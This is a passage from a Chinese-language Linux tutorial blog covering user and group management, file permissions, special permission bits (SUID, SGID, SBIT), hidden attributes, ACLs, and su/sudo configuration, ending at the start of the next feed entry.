与扩展组gid以便于我们判别某个用户是否已经存在,以及查看相关信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231430633.png" alt="image-20220323143017596"></p><h4 id="useradd命令"><a href="#useradd命令" class="headerlink" title="useradd命令"></a>useradd命令</h4><p>useradd命令用于创建新的用户账号,语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd [参数] 用户名</span><br></pre></td></tr></table></figure><p>可以使用useradd命令用于创建用户账户.使用该命令创建用户时,默认的用户家目录会被存放在&#x2F;home目录中,默认的shell解释器为&#x2F;bin&#x2F;bash,而且默认会创建一个与该用户同名的基本用户组.</p><p>useradd命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-d</td><td>指定用户的家目录（默认为&#x2F;home&#x2F;username）</td></tr><tr><td>-e</td><td>账户的到期时间，格式为YYYY-MM-DD.</td></tr><tr><td>-u</td><td>指定该用户的默认UID</td></tr><tr><td>-g</td><td>指定一个初始的用户基本组（必须已存在）</td></tr><tr><td>-G</td><td>指定一个或多个扩展用户组</td></tr><tr><td>-N</td><td>不创建与用户同名的基本用户组</td></tr><tr><td>-s</td><td>指定该用户的默认Shell解释器</td></tr></tbody></table><p>下面使用useradd命令创建一个名称为wanan的用户,并使用id命令确认信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231434891.png" alt="image-20220323143447848"></p><p>创建一个普通用户并指定家目录的路径,用户的UID以及shell解释器,在下面的命令中,请注意&#x2F;sbin&#x2F;nologin,他是终端解释器中的一员,与bash解释器有着天壤之别,一旦用户的解释器被设置为nologin,代表用户不能登录到系统中</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231437328.png" alt="image-20220323143744291"></p><h4 id="groupadd命令"><a href="#groupadd命令" class="headerlink" title="groupadd命令"></a>groupadd命令</h4><p>groupadd命令用于创建新的用户组语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">groupadd [参数] 群组名</span><br></pre></td></tr></table></figure><p>为了能够更加高效的指派系统中各个用户的权限,在工作中常常会把这几个用户加入到同一个用户组中,这样便可以针对一类用户同一安排权限.例如在工作中成立了一个部门组,当有新同事加入是就把他的账号添加到这个部门组中,这样新同事的权限就会自动跟其他同事一模一样了,从而省去了一系列繁琐的操作</p><p>创建用户组的步骤非常简单,例如使用如下命令创建一个用户组user</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231443149.png" alt="image-20220323144311110"></p><h4 id="usermod命令"><a href="#usermod命令" class="headerlink" title="usermod命令"></a>usermod命令</h4><p>usermod命令用于修改用户的属性,英文为 user modify 语法格式为 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usermod [参数] 用户名</span><br></pre></td></tr></table></figure><p>在系统中创建用户也就是修改配置文件的过程,用户的信息保存在&#x2F;etc&#x2F;passwd文件中,可以直接使用文本编辑器来修改其中的用户参数项目,也可以使用usermod命令修改已经创建的用户信息,比如用户的UID 基本&#x2F;扩展用户组 默认终端 </p><p> usermod命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-c</td><td>填写用户账户的备注信息</td></tr><tr><td>-d -m</td><td>参数-m与参数-d连用，可重新指定用户的家目录并自动把旧的数据转移过去</td></tr><tr><td>-e</td><td>账户的到期时间，格式为YYYY-MM-DD</td></tr><tr><td>-g</td><td>变更所属用户组</td></tr><tr><td>-G</td><td>变更扩展用户组</td></tr><tr><td>-L</td><td>锁定用户禁止其登录系统</td></tr><tr><td>-U</td><td>解锁用户，允许其登录系统</td></tr><tr><td>-s</td><td>变更默认终端</td></tr><tr><td>-u</td><td>修改用户的UID</td></tr></tbody></table><p>将wanan用-G参数添加到root组中</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231447012.png" alt="image-20220323144737970"></p><p>使用-u参数改变wanan用户的UID号码值</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231448838.png" alt="image-20220323144831803"></p><p>将默认的&#x2F;bin&#x2F;bash修改为&#x2F;sbin&#x2F;nologin</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231450511.png" alt="image-20220323145057472"></p><p>这个用户的终端设置为&#x2F;sbin&#x2F;nologin后用户就不能登录了,但这个用户依然可以被某个服务所调用,管理某个具体的服务,这样的好处是当黑客通过这个服务侵入之后,破坏的范围也仅仅局限于这个特定的服务,而不能使用这个用户身份登录到整台服务器上.</p><h4 id="passwd命令"><a href="#passwd命令" class="headerlink" title="passwd命令"></a>passwd命令</h4><p>passwd命令用于修改用户的密码 过期时间等信息 password 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passwd [参数] 用户名</span><br></pre></td></tr></table></figure><p>普通用户只能使用passwd命令修改自己的系统密码,而root管理员则有权限修改其他所有人的密码,root管理员在linux系统中修改自己或他人的密码时不需要验证旧密码,这一点非常方便</p><p> passwd命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-l</td><td>锁定用户，禁止其登录</td></tr><tr><td>-u</td><td>解除锁定，允许用户登录</td></tr><tr><td>–stdin</td><td>允许通过标准输入修改用户密码，如echo “NewPassWord” | passwd –stdin Username</td></tr><tr><td>-d</td><td>使该用户可用空密码登录系统</td></tr><tr><td>-e</td><td>强制用户在下次登录时修改密码</td></tr><tr><td>-S</td><td>显示用户的密码是否被锁定，以及密码所采用的加密算法名称</td></tr></tbody></table><p>修改自己的密码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231457840.png" alt="image-20220323145759795"></p><p>要修改其他人的密码,则需要先检查当前是否为root管理员权限,然后再命令后指定要修改的用户名称</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231500890.png" alt="image-20220323150015848"></p><p>可以使用passwd命令禁止用户登录系统,或者允许登录系统</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231501153.png" alt="image-20220323150158112"></p><h4 id="userdel命令"><a href="#userdel命令" class="headerlink" title="userdel命令"></a>userdel命令</h4><p>userdel命令用于删除已有的用户账户 user delete 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">userdel [参数] 用户名</span><br></pre></td></tr></table></figure><p>如果确认某位用户后续不会在登录到系统中,则可以使用userdel命令删除该用户的所有信息,在执行删除操作时,该用户的家目录默认会保留下来,此时可以使用-r参数将其删除</p><p>userdel命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-f</td><td>强制删除用户</td></tr><tr><td>-r</td><td>同时删除用户及用户家目录</td></tr></tbody></table><p>在删除一个用户时,一般会建议保留他的家目录数据,以免有重要的数据被误删,所以在使用userdel命令时可以不加参数,写清楚要删除的用户名称就行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231507233.png" alt="image-20220323150744188"></p><p>虽然此时该用户已经被删除,但家目录数据会继续存放在&#x2F;home目录中,等确认删除时手动将其删除就好</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231510920.png" alt="image-20220323151038881"></p><h3 id="文件权限与归属"><a href="#文件权限与归属" class="headerlink" title="文件权限与归属"></a>文件权限与归属</h3><p>在linux系统中,每一个文件都有归属的所有者和所属组,并规定了文件的所有者 所属组以及其他人对文件所拥有的可读(r) 可写(w) 可执行(x)等权限,对于一般的文件来说,权限比较容易理解:可读表示能够读取文件的实际内容,可写表示能够编辑 新增 修改 删除文件的实际内容; 可执行表示能够运行一个脚本程序,但是对于目录文件来说,理解其权限设置就不那么简单了.对于目录文件来说,可读表示能够读取目录内的文件列表;可写表示能够在目录内新增 删除 删除 重命名文件,而可执行则表示能够进入该目录</p><p>读写执行权限对于文件与目录可执行命令的区别</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231519544.png" alt="image-20220323151956472"></p><p>文件的可读 可写 可执行权限的英文名称分别为read write execute 可以简写为rwx也可以使用数字4 2 1 来表示,文件的所有者 文件所属组及其他用户权限之间无关联</p><p>文件权限的字符与数字表示</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231521362.png" alt="image-20220323152142290"></p><p>文件权限的数字表示法基于字符(rwx)的权限计算而来的,其目的是简化权限的表示方式,例如,某个文件的权限为7, 则代表可读,可写 可执行 (4 +2 +1);若权限为6,则表示可读 可写(4+2).现在有一个文件,其所有者拥有可读 可写 可执行权限,其文件所属组拥有可读 可写的权限,其他人只有可读的权限,那么这个文件的权限就是rwxrwr-r–,数字表示法即为764.不过不能将这三个数字相加,计算出17的结果,这个不是linux系统的权限数字表示法</p><p>这里以rw-r-x-w-为例来介绍如何将字符表示的权限转换为数字表示的权限 首先,要将各个位上的字符替换为数字</p><p>减号是占位符,代表这里没有权限,在数字表示法中用0表示,也就是说rw-转换后就是420,r-x转换后就是401,-w-转换后就是020,然后将这三组数字之间的每组数字相加得出652,这便是数字表示权限</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231532476.png" alt="image-20220323153250429"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231532968.png" alt="image-20220323153256927"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231533515.png" alt="image-20220323153322475"></p><p>这里分别包含了文件的类型 访问的权限 所属者(属主) 所属组(属组) 占用的磁盘大小 最后修改时间和文件名称等信息. 该文件类型为普通文件 所属者权限可写 可读(rw-) 所属组权限可读(r–) 其他人也只有可读权限(r–) 文件的磁盘占用大小是34298字节,最近一次修改时间是4月2日的 0:23分 文件名称为 install.log</p><p>排在权限前面的减号(-)是文件类型(减号表示普通文件) linux中不同文件由于作用不同,因此类型也不尽相同.常见的文件类型包括普通文件(-) 目录文件(d) 链接文件(l) 管道文件(p) 块设备文件(b) 以及字符设备文件(c)</p><p>普通文件的范围特别广泛,比如纯文本信息 服务配置信息 日志信息以及shell脚本等 都属于是普通文件,几乎在每个目录下都能看到 普通文件(-) 和目录文件(d) 的身影.块设备文件(b)和字符设备文件(c) 一般是指硬件设备,比如鼠标 键盘等 在&#x2F;dev&#x2F;目录中最为常见</p><h3 id="文件的特殊权限"><a href="#文件的特殊权限" class="headerlink" title="文件的特殊权限"></a>文件的特殊权限</h3><p>在复杂的环境中,单纯的rwx权限是无法满足我们的需求的,因此便有了SUID SGID与SBIT的特殊权限位.这是一种对文件权限进行设置的特殊功能,可以与一般的权限同时使用,以弥补一般权限不能使用</p><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><p>SUID是一种对二进制程序进行设置的特殊权限,能够让二进制程序的执行者临时拥有所有者的权限(仅对拥有执行权限的二进制程序有效).例如所有用户都可以执行passwd命令来修改自己的用户密码,而用户密码保存在&#x2F;etc&#x2F;shadow文件中,仔细看这个文件就会发现它的默认权限是000,也就是说除了root管理员以外,所有用户都没有查看或者编辑该文件的权限.但是在使用passwd命令时如果加上SUID特殊权限,既可以让普通用户临时获得程序所有者的身份,把变更的密码信息写入到shadow文件件中.</p><p>查看passwd命令属性时发现所有者的权限有rwx变成了rws,其中x改变成s就意味着该文件被赋予了SUID权限,如果原先权限位置上没有可执行权限x,那么被赋予特殊权限之后将变成大写的S</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203231951191.png" alt="image-20220323195110150"></p><p>一定要小心这个权限,因为一点某个命令文件被设置了SUID权限,就意味着凡是执行该文件的人都临时获取到文件所有者所对应的最高权限,因此不要将SUID权限设置到vim cat rm 等命令上面</p><h4 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h4><p>SGID特殊权限有两种应用场景:当对二进制程序进行设置时,能够让执行者临时获取文件所属组的权限;当对目录进行设置时,则是让目录内新建的文件自动继承该目录原有用户组的名称</p><p>SGID的第一种功能就是参考SUID而设计的,不同点在于执行程序的用户获取的不再是文件所有者的临时权限,而是获取到文件所属组的权限,在早起的linux系统中,&#x2F;dev&#x2F;kmem是一个字符设备文件,用于存储内核程序要访问的数据权限为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cr--r-----   1 root system 2,  1 Feb 11 2017  kmem</span><br></pre></td></tr></table></figure><p>除了root管理员或属于system组的成员之外,所有用户都没有读取该文件的权限,由于在欧宁市需要查看系统的进程状态,为了能够获取进程的状态信息,可在用于查看系统进程状态的ps命令上增加SGID特殊权限位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-r-xr-sr-x   1 bin system 59346 Feb 11 2017  ps</span><br></pre></td></tr></table></figure><p>这样一来由于ps命令被增加了SGID特殊权限位,所以当用户执行该命令时,也就临时获得了system用户组的权限,从而顺利的读取到了设备文件</p><p>每个文件都有其归属的所有者和所属组,当创建或者传送一个文件后,这个文件就会自动归属于执行这个操作的用户(即该用户时文件的所有者) 如果现在需要在一个部门内设置共享目录,让部门内的所有人员都能读取目录中的内容,那么就可以在穿件不能共享目录之后,在该目录上设置SGID特殊权限位,这样,部门内的任何人员在里面创建的任何文件都会归属该目录的所属组,而不在是自己的基本用户组.此时用到的是SGID的第二个功能,即在某个目录中创建的文件会自动继承该目录的用户组</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232039940.png" alt="image-20220323203950890"></p><p>在使用上述命令设置好目录的777权限之后确保普通用户可以向其中写入文件,并为该目录设置了SGID特殊权限位后,就可以切换至一个普通用户,然后尝试在该目录中创建文件,并查看新创建的文件是否会继承新创建的文件所在的目录的所属组名称</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232043188.png" alt="image-20220323204301150"></p><p>除了上面提到的SGID的这两个功能,在介绍 chmod 和chown</p><p>chmod命令用于设置文件的一般权限及特殊属性权限, change mode </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod [参数] 文件名</span><br></pre></td></tr></table></figure><p>这是一个与文件权限的日常设置强相关的命令 想要把一个文件的权限设置成其所有者可读可写可执行 所属组可读 可写 其他人没有任何权限,则相应的字符表示法表示rwxrw—-,其数字法表示为760</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232047154.png" alt="image-20220323204722114"></p><p>chmod命令用于设置文件的所有者和所属组,英文 change own </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown 所有者:所有组 文件名</span><br></pre></td></tr></table></figure><p>chmod和chown命令时用于修改文件属性和权限的最常用命令,他们还有一个特别的共性,就是针对目录进行操作时需要加上大写参数-R来表示递归操作,即对目录内的所有文件进行整体操作</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232050592.png" alt="image-20220323205047552"></p><h4 id="SBIT"><a href="#SBIT" class="headerlink" title="SBIT"></a>SBIT</h4><p>SBIT特殊权限位可确保用户只能删除自己的文件,而不能删除其他用户的文件.当对某个目录设置了SBIT粘滞位权限后,那么该目录中的文件就只能被其所有者执行删除操作了</p><p>与前面的SUID与SGID权限显示方法不同,当目录被设置了SBIT特殊权限位之后,文件的其他用户权限部分的x执行权限就会被替换成t或者T 原本有x执行权限则会写成t,原本没有x执行权限就会被写成T</p><p>&#x2F;tmp目录上的SBIT权限默认已经存在,这体现为其他用户权限字段的权限变为rwt</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232056106.png" alt="image-20220323205626063"></p><p>其实文件能否被删除并不取决于自身的权限,而是看其所在的目录是否有写入权限</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232058887.png" alt="image-20220323205835849"></p><p>随后切换到一个普通用户身份下,尝试删除这个由其他人创建的文件,这时就会发现,即便读 写 执行权限全开,但是由于SBIT特殊权限位的缘故,依然无法删除该文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232100803.png" alt="image-20220323210044764"></p><p>若能善加使用特殊权限，就能实现很多巧妙的功能</p><p>  SUID、SGID、SBIT特殊权限的设置参数</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>u+s</td><td>设置SUID权限</td></tr><tr><td>u-s</td><td>取消SUID权限</td></tr><tr><td>g+s</td><td>设置SGID权限</td></tr><tr><td>g-s</td><td>取消SGID权限</td></tr><tr><td>o+t</td><td>设置SBIT权限</td></tr><tr><td>o-t</td><td>取消SBIT权限</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232240906.png" alt="image-20220323224011863"></p><p>上述的代码中o+t参数是在一般权限已经设置了完毕的前提下,又新增了意向特殊权限,如果我们像将一般的权限和特殊权限一起设置,</p><p>其实SUID SGID SBIT也有对应的数字表示法,分别表示为4 2 1 也就是说777还不是最大的权限,最大的权限应该是7777,其中第一个数字代表的是特殊位置权限.</p><p>在rwxr-xr-t权限中,最后一位是t,这说明了该文件的一般权限是rwxr-xr-x,并带有SBIT特殊权限,-rwxr-xr-x即为755,而SBIT特殊权限位是1,则合并之后的结果为1755</p><p>如果权限是rwsrwSr–呢 大写的S表示原本没有执行全心,因此一般权限为rwxrw-r–,将其转换为数字表示法后的结果是764.带有SUID和SGID特殊权限的数字法表示是4和2,所以结果就是6,合并之后就是6764.</p><p>将权限的数字表示法转换成字符表示法的难度有点高,这里以5537为例.首先特殊权限5是有4+1组合成的,意味着有SUID和SBIT.SUID和SBIT的写法是,原先有执行权限则是小写s如果没有执行权限则是大写的S;而SBIT的写法则是,原先有执行权限是小写t,没有执行权限是大写的T.一般权限的537进行字符转换后应该为r-x-wxrwx,然后再此基础上增加SUID和SBIT特殊权限,合并后的结果是r-s-wxrwt</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232250971.png" alt="image-20220323225005921"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232250984.png" alt="image-20220323225013936"></p><h3 id="文件的隐藏属性"><a href="#文件的隐藏属性" class="headerlink" title="文件的隐藏属性"></a>文件的隐藏属性</h3><p>隐藏权限的专用设置命令时chattr,专用查看命令是lsattr</p><h4 id="chattr命令"><a href="#chattr命令" class="headerlink" title="chattr命令"></a>chattr命令</h4><p>chattr命令用于设置文件的隐藏属性权限, change attributes </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr [参数] 文件名称</span><br></pre></td></tr></table></figure><p>如果想要把某个隐藏功能添加到文件上,则需要在命令后面追加”+参数”,如果想要将某个隐藏功能移除文件,则需要追加”-参数”.chattr命令中可供选择的隐藏权限参数非常丰富</p><p> chattr命令中的参数及其作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>i</td><td>无法对文件进行修改；若对目录设置了该参数，则仅能修改其中的子文件内容而不能新建或删除文件</td></tr><tr><td>a</td><td>仅允许补充（追加）内容，无法覆盖&#x2F;删除内容（Append Only）</td></tr><tr><td>S</td><td>文件内容在变更后立即同步到硬盘（sync）</td></tr><tr><td>s</td><td>彻底从硬盘中删除，不可恢复（用0填充原文件所在硬盘区域）</td></tr><tr><td>A</td><td>不再修改这个文件或目录的最后访问时间（atime）</td></tr><tr><td>b</td><td>不再修改文件或目录的存取时间</td></tr><tr><td>D</td><td>检查压缩文件中的错误</td></tr><tr><td>d</td><td>使用dump命令备份时忽略本文件&#x2F;目录</td></tr><tr><td>c</td><td>默认将文件或目录进行压缩</td></tr><tr><td>u</td><td>当删除该文件后依然保留其在硬盘中的数据，方便日后恢复</td></tr><tr><td>t</td><td>让文件系统支持尾部合并（tail-merging）</td></tr><tr><td>x</td><td>可以直接访问压缩文件中的内容</td></tr></tbody></table><p>先来创建一个普通文件，然后立即尝试删除</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240915136.png" alt="image-20220324091458076"></p><p>接下来在创建一个普通文件,将其设置”不允许删除与覆盖”(+a参数)权限,然后再尝试删除</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240917531.png" alt="image-20220324091711487"></p><h4 id="lsattr命令"><a href="#lsattr命令" class="headerlink" title="lsattr命令"></a>lsattr命令</h4><p>lsattr命令用于查看文件的隐藏权限 英文 list attributes 语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsattr [参数] 文件名称</span><br></pre></td></tr></table></figure><p>文件的隐藏权限必须通过lsattr命令来查看</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240920320.png" alt="image-20220324092034283"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240921352.png" alt="image-20220324092116317"></p><p>一帮会将-a参数设置到日志文件中(&#x2F;var&#x2F;logmessages),这样可以在不影响系统正常写入日志的前提下,防止黑客擦除自己的作案证据.如果希望彻底保护某个文件,不允许其他人修改或者删除它的话,可以加上-i参数</p><p>要想彻底删除某个文件,可以使用-s参数来保证其被删除后不可恢复,硬盘上的文件数据会被用零块重新填充</p><h3 id="文件访问控制列表"><a href="#文件访问控制列表" class="headerlink" title="文件访问控制列表"></a>文件访问控制列表</h3><p>如果希望对某个指定的用户进行单独的权限控制,就需要用到文件的访问控制列表了(ACL),基于普通文件或者目录设置ACL其实就是针对特定的用户或用户组设置文件或者目录的操作权限,更加精确的派发权限.如果针对某个目录设置了ACL则目录中的文件会继承其ACL权限,若针对文件设置了ACL,则文件不在继承其所在目录的ACL权限</p><p>先切换到普通用户，然后尝试进入root管理员的家目录中</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240940560.png" alt="image-20220324094030519"></p><h4 id="setfacl命令"><a href="#setfacl命令" class="headerlink" title="setfacl命令"></a>setfacl命令</h4><p>setfacl命令用于管理文件的ACL权限规则 set files ACL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setfacl [参数] 文件名称</span><br></pre></td></tr></table></figure><p>ACL权限提供的是在所有者 所属组 其他人的读 写 执行权限之外的特殊权限控制.使用setfacl命令可以针对单一用户或用户组 单一文件或目录来进行 读 写 执行权限的控制 其中针对目录文件需要使用 -R 递归参数 针对普通文件则使用-m 参数 如果想要删除某个文件的ACL可以使用-b参数</p><p> setfacl命令中的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-m</td><td>修改权限</td></tr><tr><td>-M</td><td>从文件中读取权限</td></tr><tr><td>-x</td><td>删除某个权限</td></tr><tr><td>-b</td><td>删除全部权限</td></tr><tr><td>-R</td><td>递归子目录</td></tr></tbody></table><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240945063.png" alt="image-20220324094544019"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240945340.png" alt="image-20220324094551294"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240946640.png" alt="image-20220324094656601"></p><p>常用的ls命令时看不到ACL信息的,但是却可以看到文件权限最后的一个(.)变成了加号(+),这就意味着该文件已经设置了ACL </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240948391.png" alt="image-20220324094833346"></p><h4 id="getfacl命令"><a href="#getfacl命令" class="headerlink" title="getfacl命令"></a>getfacl命令</h4><p>getfacl命令用于查看文件的ACL权限规则, get files ACL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getfacl [参数] 文件名称</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240949215.png" alt="image-20220324094949167"></p><p>允许某个组的用户都可以读写&#x2F;etc&#x2F;fstab文件：</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240950533.png" alt="image-20220324095000483"></p><p>要清空所有ACL权限，请用-b参数；要删除某一条指定的权限，就用-x参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240950333.png" alt="image-20220324095014290"></p><p>ACL权限的设置都是立即且永久生效的，不需要再编辑什么配置文件</p><p>在备份&#x2F;home目录上的ACL权限时，可使用-R递归参数，这样不仅能够把目录本身的权限进行备份，还能将里面的文件权限也自动备份.getfacl在备份目录权限时不能使用绝对路径的形式，因此我们需要先切换到最上层根目录，然后再进行操作。</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240951347.png" alt="image-20220324095101305"></p><p>ACL权限的恢复也很简单，使用的是–restore参数。由于在备份时已经指定是对&#x2F;home目录进行操作，所以不需要写对应的目录名称，它能够自动找到要恢复的对象</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240951501.png" alt="image-20220324095116464"></p><h3 id="su命令与sudo服务"><a href="#su命令与sudo服务" class="headerlink" title="su命令与sudo服务"></a>su命令与sudo服务</h3><h4 id="su命令"><a href="#su命令" class="headerlink" title="su命令"></a>su命令</h4><p>su命令可以解决切换用户身份的需求,使得当前用户在不退出登录的情况下,顺利的切换到其他用户</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240953570.png" alt="image-20220324095334523"></p><p>这其中的减号(-),就意味着完全切换到新用户,即把环境变量信息也变更为新用户的响应信息,而不是保留原始信息</p><p>从root管理员切换到普通用户时是不需要验证密码的,而从普通用户切换成root用户就需要进行密码验证了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203240956232.png" alt="image-20220324095601190"></p><p>虽然这样使用su命令,普通用户可以完全切换到root管理员用户的身份来进行工作但是这将暴露root管理员的密码</p><h4 id="sudo命令"><a href="#sudo命令" class="headerlink" title="sudo命令"></a>sudo命令</h4><p>sudo命令用于给普通鱼护提供额外的权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo [参数] 用户名</span><br></pre></td></tr></table></figure><p>使用sudo命令可以给普通用户提供额外的权限来完成只有root用户才能完成的任务,可限制用户执行指定的命令,记录用户执行过的每一条命令,集中管理用户与全心(&#x2F;etc&#x2F;sudoers),以及可以在验证密码后的一段时间内无需让用户再次验证密码</p><p>  sudo命令中的可用参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-h</td><td>列出帮助信息</td></tr><tr><td>-l</td><td>列出当前用户可执行的命令</td></tr><tr><td>-u 用户名或UID值</td><td>以指定的用户身份执行命令</td></tr><tr><td>-k</td><td>清空密码的有效时间，下次执行sudo时需要再次进行密码验证</td></tr><tr><td>-b</td><td>在后台执行指定的命令</td></tr><tr><td>-p</td><td>更改询问密码的提示语</td></tr></tbody></table><h4 id="visudo命令"><a href="#visudo命令" class="headerlink" title="visudo命令"></a>visudo命令</h4><p>visudo命令用于编辑 配置用户sudo的权限文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">visudo [参数]</span><br></pre></td></tr></table></figure><p>这是一条会自动调用vi编辑器来配置&#x2F;etc&#x2F;sudoers权限文件的命令.能够解决多个用户同时自改权限而导致的冲突问题.visudo命令还可以对配置文件内的参数进行语法检查,并在发现参数错误时进行报错提醒.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241004757.png" alt="image-20220324100435706"></p><p>使用visudo命令配置权限文件的时候.其操作方法和vim编辑器中用到的方法完全一致因此在编写完成后记得在末行模式下保存并退出。在配置权限文件时，按照下面的格式在第101行（大约）填写上指定的信息</p><pre><code>谁可以使用 允许使用的主机 = （以谁的身份） 可执行命令的列表谁可以使用：稍后要为哪位用户进行命令授权。允许使用的主机：可以填写ALL表示不限制来源的主机，亦可填写如192.168.10.0/24这样的网段限制来源地址，使得只有从允许网段登录时才能使用sudo命令。以谁的身份：可以填写ALL表示系统最高权限，也可以是另外一位用户的名字。可执行命令的列表：可以填写ALL表示不限制命令，亦可填写如/usr/bin/cat这样的文件名称来限制命令列表，多个命令文件之间用逗号（,）间隔。</code></pre><p>在Linux系统中配置服务文件时，虽然没有硬性规定，但从经验来讲新增参数的位置不建议太靠上，以免我们新填写的参数在执行时失败，导致一些必要的服务功能没有成功加载。一般建议在配置文件中找一下相似的参数，然后在相邻位置进行新的修改，或者在文件的中下部位置进行添加后修改</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241006086.png" alt="image-20220324100615041"></p><p>在填写完毕后记得要先保存再退出，然后切换至指定的普通用户身份，此时就可以用sudo -l命令查看所有可执行的命令了（在下面的命令中，验证的是普通用户的密码，而不是root管理员的密码)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241006032.png" alt="image-20220324100630970"></p><p>作为一名普通用户，是肯定不能看到root管理员的家目录（&#x2F;root）中的文件信息的，但是，只需要在想执行的命令前面加上sudo命令就行了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241007640.png" alt="image-20220324100708591"></p><p>每次执行sudo命令后都会要求验证一下密码。虽然这个密码就是当前登录用户的密码，但是每次执行sudo命令都要输入一次密码其实也挺麻烦的，这时可以添加NOPASSWD参数，使得用户下次再执行sudo命令时就不用密码验证</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241007780.png" alt="image-20220324100756732"></p><p>这样，当切换到普通用户后再执行命令时，就不用再频繁地验证密码了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241008670.png" alt="image-20220324100808623"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习(三)</title>
      <link href="/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%B8%89)/"/>
      <url>/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%B8%89)/</url>
      
